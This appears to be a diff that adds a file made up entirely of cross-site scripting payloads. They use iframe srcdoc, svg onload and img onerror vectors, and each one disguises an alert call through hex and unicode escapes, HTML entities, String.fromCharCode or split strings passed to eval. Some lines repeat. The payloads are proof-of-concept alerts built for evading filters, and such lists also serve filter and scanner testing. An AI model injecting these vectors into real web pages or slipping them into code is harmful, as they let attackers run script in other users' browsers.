@@ -1,0 +1,15 @@
+<iframe srcdoc="<svg onload=window['\x61\x6c\x65\x72\x74'](String.fromCharCode(49,49,49))>">
+<svg xmlns="http://www.w3.org/2000/svg" onload="&#97;&#108;&#101;&#114;&#116;(1)">
+<svg onload='setTimeout(String.fromCharCode(97,108,101,114,116).concat("(",49,49,49,")"))'>
+<iframe srcdoc="<script>eval('al'+'ert(1)')</script>">
+<svg/onload="eval('\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029')">
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,49,49,41))>">
+<iframe srcdoc="<script type='text/javascript'>alert(1)</script>">
+<svg onload=window['\u0061\u006c\u0065\u0072\u0074'](1)>
+<iframe srcdoc="<img src=x onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,49,49,41))'>">
+<svg xmlns="http://www.w3.org/2000/svg" onload="&#97;&#108;&#101;&#114;&#116;(1)">
+<iframe srcdoc="<script>eval('al'+'ert(1)')</script>">
+<svg onload='setTimeout(String.fromCharCode(97,108,101,114,116).concat("(",49,49,49,")"))'>
+<iframe srcdoc="<svg onload=window['\x61\x6c\x65\x72\x74'](1)>">
+<iframe srcdoc="<img src=x onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,49,49,41))'>">
+<svg/onload="eval('\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029')">
